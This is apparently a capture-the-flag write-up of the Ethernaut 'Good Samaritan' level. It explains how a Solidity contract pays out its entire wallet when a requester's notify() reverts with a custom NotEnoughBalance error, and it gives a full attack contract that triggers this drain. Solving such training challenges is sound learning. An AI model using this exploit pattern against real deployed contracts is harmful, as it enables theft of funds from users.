# Ethernaut #27 — Good Samaritan

**Status:** Theory Complete | **Code:** Ready | **Execution:** Awaiting funds

## Contract Analysis

This challenge explores custom error handling and the `notify` pattern in Solidity.

### The Vulnerability

The GoodSamaritan contract has a `requestDonation()` function that:
1. Transfers 10 tokens to the requester
2. Calls `notify(uint256 amount)` on the requester
3. If `notify()` reverts with a specific custom error (`NotEnoughBalance`), it transfers the ENTIRE wallet balance

```solidity
// The exploit path
if (!success) {
    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == _data) {
        // transfer the remaining wallet balance
        wallet.transferRemainder(requester);
    }
}
```

### The Attack

Create a malicious receiver that:
1. Reverts ONLY when `amount == 10` (the initial donation)
2. Uses the custom error `NotEnoughBalance()` 
3. This triggers the fallback path transferring the full balance

### Attack Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";

contract GoodSamaritanAttack {
    error NotEnoughBalance();
    
    GoodSamaritan public target;
    
    constructor(address _target) {
        target = GoodSamaritan(_target);
    }
    
    function attack() external {
        target.requestDonation();
    }
    
    // This gets called by the wallet
    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance(); // Triggers the full transfer!
        }
    }
}
```

### Key Learning

**Custom errors can be weaponized.** The contract assumes a revert means failure, but we craft a revert that signals a "special" condition leading to more funds.

**Pattern:** Always validate *why* something failed, not just *that* it failed.

---
*Documented: 2026-02-01 | Ready for execution when funded*
